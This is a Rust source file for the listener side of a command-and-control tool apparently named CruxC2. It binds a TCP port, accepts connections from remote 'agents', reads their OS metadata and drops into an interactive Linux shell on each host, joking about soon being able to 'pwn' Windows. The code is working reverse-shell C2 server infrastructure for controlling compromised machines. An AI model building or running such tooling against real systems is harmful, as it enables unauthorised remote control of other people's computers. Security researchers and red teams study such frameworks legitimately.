#[path = "../utils/mod.rs"]
mod utils;
mod args;
mod linux_shell;

use clap::error::Result;
use clap::{Parser};
use std::net::{TcpListener, TcpStream, Shutdown};
use serde_json;
use colored::Colorize;
// Local modules
use args::CruxServerArgs;
use linux_shell::linux_shell;
use utils::os::{OS, Metadata};
use utils::network::read_length_prefix;

static BANNER: &str = "
   ______                             ______   _____
 .' ___  |                          .' ___  | / ___ `.
/ .'   \\_| _ .--.  __   _   _   __ / .'   \\_||_/___) |
| |       [ `/'`\\][  | | | [ \\ [  ]| |        .'____.'
\\ `.___.'\\ | |     | \\_/ |, > '  < \\ `.___.'\\/ /_____
 `.____ .'[___]    '.__.'_/[__]`\\_] `.____ .'|_______|

";


fn handle_client(stream: &mut TcpStream, agent_id: u16) -> Result<(), Box<dyn std::error::Error>>{
    // Get Peer IP address
    let peer_ip = stream.peer_addr()?;

    println!("Agent {} Connected from {}!", agent_id, peer_ip);

    // Get metadata from client
    let metabuf = read_length_prefix(stream)?;
    let meta_str = String::from_utf8_lossy(&metabuf);
    let meta: Metadata = serde_json::from_str(&meta_str)?;

    // Create prompt
    // Launch shell
    match meta.os_type {
        OS::Linux => {
            let _ = linux_shell(stream, &meta_str);
        },
        OS::Windows => {
            println!("Windows Support is under construction. You will be able to pwn the inferior OS soon™:)");
        },
        _ => {
            eprintln!("Unknown OS type");
        }
    };
    stream.shutdown(Shutdown::Both)?;
    println!("Agent {} exiting!", agent_id);
    return Ok(())
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = CruxServerArgs::parse();

    // Bind to listening port
    let addr = format!("0.0.0.0:{}", args.port);
    let listener = TcpListener::bind(&addr)?;

    println!("{}\nCruxServer is listening on port {}",BANNER.yellow().bold(), args.port.cyan().bold());

    let mut agent_id = 0;

    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                if let Err(e) = handle_client(&mut stream, agent_id){
                    eprintln!("Agent handling error: {}", e);
                    let _ = stream.shutdown(Shutdown::Both);
                }
                agent_id += 1;
            }
            Err(e) => eprintln!("Connection failed: {}", e),
        }
    }
    Ok(())
}
